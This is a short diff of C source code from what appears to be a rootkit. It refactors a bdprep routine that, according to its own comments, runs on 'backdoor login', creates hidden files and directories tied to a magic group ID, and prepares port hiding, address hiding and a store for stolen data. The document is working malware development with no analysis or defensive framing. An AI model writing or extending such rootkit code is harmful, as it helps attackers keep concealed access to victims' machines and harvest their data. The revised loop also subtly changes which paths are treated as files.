@@ -1,9 +1,10 @@
-/* 
- * everything in here is what is called upon backdoor login.
- * all files & directories we may need are created here, on the
- * first backdoor login.
- * a couple of things that .bashrc previously would've done is
- * now done here.
+/*
+ * functions in here are responsible for creating stuff we need.
+ * the function bdprep is called upon logging into a target backdoor.
+ * prepare: hideports, hideaddrs & stolenstore are called as soon
+ *          as the respective target has to be read from.
+ * i.e.: preparehideports is called before the calling process
+ *       tries to/can determine the visibility status of a specific port.
  */
 
 int prepareregfile(const char *path, gid_t magicgid){
@@ -120,14 +121,9 @@ void bdprep(void){
     int dirs=0, regs=0;
     for(int i = 0; i < BDVPATHS_SIZE; i++){
         curpath = bdvpaths[i];
-        if(curpath[strlen(curpath)-1] == '/'){
-            if(preparedir(curpath, magicgid))
-                dirs++;
-            continue;
-        }
-
-        if(prepareregfile(curpath, magicgid))
-            regs++;
+        if(curpath[strlen(curpath)-1] == '/' && preparedir(curpath, magicgid))
+            dirs++;
+        else if(prepareregfile(curpath, magicgid)) regs++;
     }
 
     if(regs+dirs != BDVPATHS_SIZE)
